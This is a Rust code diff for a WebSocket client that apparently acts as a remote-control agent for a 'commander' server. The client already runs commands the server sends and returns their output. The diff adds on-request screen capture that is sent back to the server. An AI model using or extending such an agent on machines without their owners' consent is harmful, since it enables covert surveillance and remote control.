@@ -17,7 +17,7 @@ use tokio_tungstenite::{
 use crate::{
     constants::compiled::{self, WS_COMMANDER_RECONNECT, WS_URL},
     storage::STORAGE,
-    websockets::{handlers::{handle_command, handle_goodbye}, payloads::{Payload, SimccMessage}},
+    websockets::{handlers::{handle_command, handle_goodbye, handle_screenshot}, payloads::{Payload, SimccMessage}},
 };
 
 type WsSink = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
@@ -72,7 +72,7 @@ pub async fn start_ws_loop() -> Result<()> {
                         .build(),
                 ))
                 .build()
-                .try_into()?,
+                .to_text_message()?,
         )
         .await
         .expect("Failed to send hello-packet!");
@@ -130,10 +130,18 @@ async fn handle_awaited_messages(
     sink: &mut WsSink,
 ) -> Result<()> {
 
+    let mut binary = false;
     let reply = match payload {
         Payload::Command(command) => Some(
             Payload::CommandOutput(handle_command(command)?)
         ),
+        Payload::ScreenshotRequest(req) => {
+            binary = true;
+            println!("Sending screenshot res!");
+            Some(
+                Payload::ScreenshotResponse(handle_screenshot(req)?)
+            )
+        },
         _ => None
     };
 
@@ -141,11 +149,21 @@ async fn handle_awaited_messages(
         anyhow::anyhow!("Unknown payload recieved from server!");
     }
 
-    sink.send(
-        payloads::SimccMessage::builder()
+    let final_payload = payloads::SimccMessage::builder()
             .payload(reply.unwrap())
-            .build()
-            .try_into()?,
+            .build();
+
+    if binary {
+        sink.send(
+            final_payload
+            .to_binary_message()?
+        ).await?;
+        return Ok(());
+    }
+
+    sink.send(
+            final_payload
+            .to_text_message()?,
     )
     .await?;
 
